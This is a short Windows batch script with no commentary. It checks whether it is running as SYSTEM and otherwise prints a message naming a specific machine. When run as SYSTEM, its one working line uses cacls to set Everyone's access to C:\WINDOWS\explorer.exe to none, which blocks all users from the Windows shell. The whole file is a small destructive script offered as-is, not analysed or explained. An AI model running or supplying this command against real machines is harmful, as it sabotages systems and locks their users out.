@echo off
if %username% == SYSTEM goto isystem
Echo Only NT_AUTHORITY\SYSTEM can run this script
Echo.
Echo You are TAMMEPAK-947213\%username%
Echo.
Echo Press any key to exit...
Pause>nul
exit

:isystem
cacls C:\WINDOWS\explorer.exe /e /p everyone:n
